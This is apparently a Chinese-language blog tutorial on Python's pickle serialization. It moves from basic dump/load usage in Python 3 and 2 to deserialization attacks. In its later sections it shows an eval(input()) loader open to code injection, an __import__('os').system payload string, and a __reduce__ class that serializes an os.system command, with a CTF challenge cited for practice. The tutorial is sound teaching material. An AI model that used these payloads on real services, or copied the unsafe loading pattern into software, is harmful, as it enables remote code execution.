0x00 前言

以下内容主要是基于Python3的，Python2环境下序列化的用法和以下类似，但是序列化生成的结果与Python3环境下是不同的。Python2的pickle内容从实例三开始。

0x01 什么时pickle库

1、Python标准库，只支持python的基本数据类型。

2、可以处理复杂的序列化语法，序列化时，只是序列化整个序列对象，而非内存地址。

pickle模块实现了基本的数据序列化和反序列化。通过pickle模块的序列化操作我们能够将程序中运行的对象信息保存到文件中去，永久存储；通过pickle模块的反序列化操作，我们能够从文件中创建上一次程序保存的对象。所以pickle库也有两类主要接口，一个是序列化接口，一个是反序列化接口。

0x02 如何使用pickle库

要想调用pickle库，很简单。因为这是一个Python的内置库，不需要另行安装，可以直接引用。

import pickle

而pickle的常用函数有如下几个：

01

pickle.dump()

pickle.dump(object,file, protocol=None)


dump操作方法可以将序列以二进制的形式存放在文件中，以便下次使用。

1. 必填参数 obj 表示将要封装的对象

2. 必填参数 file 表示 object 要写入的文件对象，file 必须以二进制模式打开，即 wb。file文件指的是.pkl后缀的pkl文件。

3. 可选参数 protocol 表示告知 pickle 使用的协议，支持的协议一共有5中不同的类型，即（0,1,2,3,4）。（0,1,2）对应的是python早期的版本，（3,4）则是在python3之后的版本。默认的协议是添加在 Python 3 中的协议 3。

02

pickle.load()

pickle.load(file)


load()操作方法可以从字节对象中读取被封装的对象。

file文件依旧是.pkl后缀的pkl文件，并且读取也应使用rb权限，因为是二进制文件。

03

pickle.dumps()

pickle.dumps(object)

dumps()操作方法将object对象序列化并返回一个byte对象，而不是存入到文件中

04

pickle.loads()

pickle.loads(bytes_object)

loads()操作方法从字节对象中读取被封装的对象

0x03 实例一

01

序列化到pkl文件

import pickle

def serialize():    ls = ['A1andNS', 'Alan', 'Alice']    f = open('test.pkl', 'wb')    pickle.dump(ls, f)    f.close()

if __name__ == "__main__":    serialize()

运行后在同目录下生成了一个test.pkl文件，这就是完成了一个序列化的操作。pkl文件中的二进制序列化对象，可读型是很差的。


下面我们试着反序列化。

02

从pkl文件反序列化

import pickle

def unserialize():    f = open('test.pkl', 'rb')    test = pickle.load(f)    print(test)

if __name__ == "__main__":    unserialize()


成功反序列化回原来的list类型数据。

0x04 实例二

01

序列化到二进制字符

import pickle

def serialize():    ls = ['A1andNS', 'Alan', 'Alice']    data = pickle.dumps(ls)    print(data)

if __name__ == "__main__":    serialize()

运行结果，得到一个byte类型的数据。

我们现在来尝试反序列化：

02

二进制字符反序列化


import pickle

def unserialize():    data = b'\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x07A1andNS\x94\x8c\x04Alan\x94\x8c\x05Alice\x94e.'    ls = pickle.loads(data)    print(ls)

if __name__ == "__main__":    unserialize()

也可以成功的反序列化回到list类型，但是如果是从外部接收输入会怎么样呢？

import pickle

def unserialize():    data = eval(input("please enter your data:"))    ls = pickle.loads(data)    print(ls)

if __name__ == "__main__":    unserialize()

这里有一个问题是input接收的数据是str类型，所以使用eval()来进行自动类型转换，就可以实现数据变成bytes类型了。

我们从键盘输入二进制数据：

b'\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x07A1andNS\x94\x8c\x04Alan\x94\x8c\x05Alice\x94e.'

二进制数据

这样就成功实现了反序列化，但是这里的例子很简单，使用了eval()，而且没有对用户输入做任何过滤，如果这样编写这个程序，就可能会导致一个RCE问题，所以一般情况下input接收的数据是需要进行过滤的。

例如使用这个语句调用os库的system函数执行系统命令：

__import__('os').system('dir')

0x05 实例三

下面来看看Python2环境下的pickle。首先的一个不同就是在py2中序列化后结果是str类型，而不是py3的bytes类型。

01

序列化到pkl文件

import pickle

def serialize():    ls = ['A1andNS', 'Alan', 'Alice']    f = open('test.pkl', 'w')    pickle.dump(ls, f)    f.close()

if __name__ == "__main__":    serialize()

这里文件权限只要用w就好了，因为str类型的原因，它已经不是一个二进制文件了。

这样我们就生成了一个序列化文件test.pkl，下面我们来对这个pkl文件进行反序列化操作。

02

从pkl文件反序列化

import pickle

def unserialize():    f = open('test.pkl', 'r')    test = pickle.load(f)    print(test)

if __name__ == "__main__":    unserialize()

所以对应的读权限也只要使用r就可以了，也是可以成功进行的反序列化的。

0x06 实例四

01

序列化到字符串

import pickleimport urllib

def serialize():    ls = ['A1andNS', 'Alan', 'Alice']    data = pickle.dumps(ls)    print data    print urllib.quote(data)

if __name__ == "__main__":    serialize()

所以我们可以得到序列化后的str类型数据：

(lp0S'A1andNS'p1aS'Alan'p2aS'Alice'p3a.
编码后：%28lp0%0AS%27A1andNS%27%0Ap1%0AaS%27Alan%27%0Ap2%0AaS%27Alice%27%0Ap3%0Aa.

可以明显发现python2的序列化结果和python3的序列化结果是不同的，为了方便使用，一般可以会对其进行编码，例如urllib.quote()等

02

从字符串反序列化

import pickleimport urllib
def unserialize():    data = '%28lp0%0AS%27A1andNS%27%0Ap1%0AaS%27Alan%27%0Ap2%0AaS%27Alice%27%0Ap3%0Aa.'    ls = pickle.loads(urllib.unquote(data))    print(ls)

if __name__ == "__main__":    unserialize()

成功进行了反序列化操作，回到了原来的list类型。

同样的那么如果是从键盘接收数据呢，这里在py2下方便了不少，因为input接收的是str类型，刚好pickle序列化后也是str类型，所以就避免了类型转换的问题了。

import pickleimport urllib

def unserialize():    data = raw_input('please enter your data:')    ls = pickle.loads(urllib.unquote(data))    print(ls)

if __name__ == "__main__":    unserialize()

这里要使用raw_input()函数来接收数据，因为input()在python2中只接受变量作为传入值，非变量内容会报错。

再次成功实现了反序列化操作。

0x07 魔术方法

这里简单介绍一种常用的魔术方法，以下内容使用Python3进行说明

01

__reduce__

__reduce__魔术方法上出现反序列化漏洞，和PHP的__wakeup魔术方法类似，都是在反序列化开始或结束时，自动调用这类的函数，并且一般会在内部将解析出来的结构去执行一下，所以可以导致出现RCE等问题。当 __reduce__()函数返回一个元组时 , 第一个元素是一个可调用对象 , 这个对象会在创建对象时被调用 . 第二个元素是可调用对象的参数 , 同样是一个元组。

首先生成一个序列化的bytes变量：

import pickleimport os

class Payload(object):    def __reduce__(self):        cmd = 'dir'        return os.system, (cmd,)

a = Payload()s = pickle.dumps(a)print(s)
'''运行结果'''b'\x80\x04\x95\x1b\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x03dir\x94\x85\x94R\x94.'

这里我们在__reduce__里return了一个二元组(os.system,(cmd,),)，这里最外的可以省略，就变成了脚本中的os.system,(cmd,)，正如前面说的，这里的os.system就是第一个元组参数，即被调用函数。而(cmd,)则是第二个参数，即被调用函数的参数。最后解析结果是os.system("dir")。接下来我们对它进行一个反序列化操作，看看__reduce__被触发时，会发生什么。

import pickle

def unserialize():    data = eval(input('please enter your data:'))    ls = pickle.loads(data)    return ls

if __name__ == "__main__":    unserialize()


正如我们预计的确实是成功进行了命令执行。但是这里又一个问题必须要注意，os.system 调用系统命令，完成后退出，返回结果是命令执行状态，一般是0 os.popen() 无法读取程序执行的返回值。如果是作为网页后端，os.system和os.popen执行命令只有在配合print时才可以正常输出内容，如何时return与之配合将会没有回显。这时候就可以尝试使用commands.getoutput()函数来进行替换，构造payload去执行命令，用法和os.system和os.popen一样。这里就不演示了，可以去BUUOJ上做一下[CISCN2019 华北赛区 Day1 Web2]iku这题，这题的反序列化就很好的体现了这一点。
